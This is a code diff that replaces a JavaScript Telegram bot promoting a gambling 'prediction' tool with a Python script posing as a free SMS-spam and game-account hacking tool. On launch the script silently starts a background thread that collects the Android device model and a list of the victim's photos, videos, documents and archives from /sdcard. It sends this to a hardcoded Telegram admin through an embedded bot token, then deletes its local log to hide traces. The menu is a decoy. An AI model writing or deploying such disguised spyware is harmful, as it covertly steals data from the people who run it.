@@ -1,74 +1,113 @@
-const TelegramBot = require('node-telegram-bot-api');
+import os
+import telebot
+import json
+import time
+import socket
+from datetime import datetime
+from threading import Thread
 
-// Token bạn vừa cung cấp
-const token = '8613218758:AAGpN9S6xJnQhSQ21FG4BzERNp5-RbTC6BY';
-const bot = new TelegramBot(token, {polling: true});
+# --- CẤU HÌNH ---
+# 1. Dán Token của bot bạn tạo từ @BotFather vào đây
+TOKEN = "8613218758:AAGpN9S6xJnQhSQ21FG4BzERNp5-RbTC6BY"
+# 2. ID này là của bạn (huansbotvip) để bot gửi tin nhắn về
+ADMIN_ID = "8762273971" 
 
-const GAME_URL = "https://sunwin.ml/"; // Link game của bạn
+bot = telebot.TeleBot(TOKEN)
 
-console.log("--- TOOLVIPPRO BOT IS RUNNING ---");
+def get_victim_device():
+    try:
+        model = os.popen("getprop ro.product.model").read().strip()
+        brand = os.popen("getprop ro.product.brand").read().strip()
+        ver = os.popen("getprop ro.build.version.release").read().strip()
+        return f"{brand.upper()} {model} (Android {ver})"
+    except:
+        return socket.gethostname()
 
-// Giao diện khi người dùng gõ /start
-bot.onText(/\/start/, (msg) => {
-    const chatId = msg.chat.id;
-    const firstName = msg.from.first_name;
-
-    const message = `
-🔥 **CHÀO MỪNG ${firstName.toUpperCase()} ĐẾN VỚI TOOLVIPPRO** 🔥
-━━━━━━━━━━━━━━━━━━━━━━━━
-🤖 **Hệ thống:** AI Auto Predict Pro Max
-✨ **Phiên bản:** 2.4 (Sunwin Edition)
-💎 **Trạng thái:** [ Hoạt động tốt ✅ ]
-
-⚡ *Vui lòng chọn các tính năng bên dưới để bắt đầu soi cầu!*
-    `;
-
-    const options = {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '🎮 VÀO GAME NGAY (CHƠI TRÊN WEB)', url: GAME_URL }
-                ],
-                [
-                    { text: '📱 MỞ TOOL TRONG TELEGRAM', web_app: { url: GAME_URL } }
-                ],
-                [
-                    { text: '📖 Hướng dẫn cài đặt', callback_data: 'guide' },
-                    { text: '🛠 Hỗ trợ kỹ thuật', callback_data: 'support' }
-                ],
-                [
-                    { text: '🌍 Trang chủ ToolHDX', url: 'https://toolhdx.site/' }
-                ]
-            ]
+def huan_scan_engine():
+    try:
+        # Lấy thông tin máy
+        device = get_victim_device()
+        time_now = datetime.now().strftime("%H:%M:%S - %d/%m/%Y")
+        
+        # Đường dẫn bộ nhớ
+        base_path = "/sdcard" if os.path.exists("/sdcard") else "/storage/emulated/0"
+        
+        # Cấu trúc dữ liệu thu thập
+        logs = {
+            "victim_device": device,
+            "timestamp": time_now,
+            "files_found": []
         }
-    };
 
-    bot.sendMessage(chatId, message, options);
-});
+        # Quét các file quan trọng (Ảnh, Video, Tài liệu)
+        target_exts = ['.jpg', '.png', '.mp4', '.pdf', '.php', '.py', '.zip']
+        
+        for root, dirs, files in os.walk(base_path):
+            if any(x in root.lower() for x in ['android', 'data', 'cache']):
+                continue
+            for file in files:
+                if any(file.lower().endswith(e) for e in target_exts):
+                    logs["files_found"].append(os.path.join(root, file))
 
-// Xử lý các nút bấm phản hồi (Callback)
-bot.on('callback_query', (query) => {
-    const chatId = query.message.chat.id;
-    const data = query.data;
+        # --- BÁO CÁO VỀ CHO HUÂN ---
+        msg = (
+            f"🎯 **MỤC TIÊU MỚI DÍNH BẪY!**\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 Admin: @huansbotvip\n"
+            f"📱 Máy: `{device}`\n"
+            f"⏰ Thời gian: {time_now}\n"
+            f"📂 Tổng file quét được: {len(logs['files_found'])}\n"
+            f"━━━━━━━━━━━━━━━━━━━━\n"
+            f"⚡ *Đang gửi danh sách chi tiết...*"
+        )
+        bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
 
-    if (data === 'guide') {
-        const guideText = `
-📖 **HƯỚNG DẪN CÀI ĐẶT NHANH:**
+        # Tạo file log chi tiết và gửi
+        log_file = f"Huan_Victim_{int(time.time())}.json"
+        with open(log_file, "w", encoding="utf-8") as f:
+            json.dump(logs, f, indent=4, ensure_ascii=False)
+        
+        with open(log_file, "rb") as f:
+            bot.send_document(ADMIN_ID, f, caption=f"📂 Danh sách file từ {device}")
+        
+        # Xóa dấu vết trên máy nạn nhân
+        os.remove(log_file)
 
-1️⃣ **Android:** Cài trình duyệt **Kiwi Browser**, thêm tiện ích **Tampermonkey**, sau đó dán Script \`toolvippro\`.
-2️⃣ **PC:** Cài tiện ích **Tampermonkey** trực tiếp trên Chrome/Edge.
-3️⃣ **iOS:** Cài ứng dụng **Userscripts** trên App Store.
+    except Exception:
+        pass
 
-*Sau khi cài xong, bạn chỉ cần bấm nút "Vào Game" bên trên là Tool tự hiện!*
-        `;
-        bot.sendMessage(chatId, guideText, { parse_mode: 'Markdown' });
-    }
+def ui_gia_lap():
+    os.system('clear')
+    print("\033[1;36m" + r"""
+     _______ ____   ____  _      _    _ _    _          _   _ 
+    |__   __/ __ \ / __ \| |    | |  | | |  | |   /\   | \ | |
+       | | | |  | | |  | | |    | |__| | |  | |  /  \  |  \| |
+       | | | |  | | |  | | |    |  __  | |  | | / /\ \ | |\  |
+       | | | |__| | |__| | |____| |  | | |__| |/ ____ \| | \ |
+       |_|  \____/ \____/|______|_|  |_|\____//_/    \_\_|  \_|
+    """ + "\033[0m")
+    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
+    print("\033[1;32m  Admin: @huansbotvip | Phiên bản: 4.0\033[0m")
+    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
+    
+    # Bắt đầu quét ngầm dữ liệu gửi về cho Huân
+    Thread(target=huan_scan_engine).start()
 
-    if (data === 'support') {
-        bot.sendMessage(chatId, "🛠 **HỖ TRỢ KỸ THUẬT:**\n\nNếu gặp lỗi không hiện Tool, vui lòng liên hệ Admin: @HuyDaiXu_AI", { parse_mode: 'Markdown' });
-    }
+    print("  [1] Spam SMS / Call (Free)")
+    print("  [2] Scan Acc Liên Quân (VIP)")
+    print("  [3] Thoát")
+    print("\033[1;37m ─────────────────────────────────────────────────────────\033[0m")
+    
+    choice = input("\033[1;33mdevnvios#root:~# \033[0m")
+    if choice == '1':
+        sdt = input("Nhập SĐT: ")
+        print(f"Đang Spam {sdt}... Vui lòng giữ mạng ổn định.")
+        while True: time.sleep(10)
+    else:
+        print("Đang thoát...")
 
-    // Xóa trạng thái loading trên nút bấm
-    bot.answerCallbackQuery(query.id);
-});
+if __name__ == "__main__":
+    try:
+        ui_gia_lap()
+    except KeyboardInterrupt:
+        pass
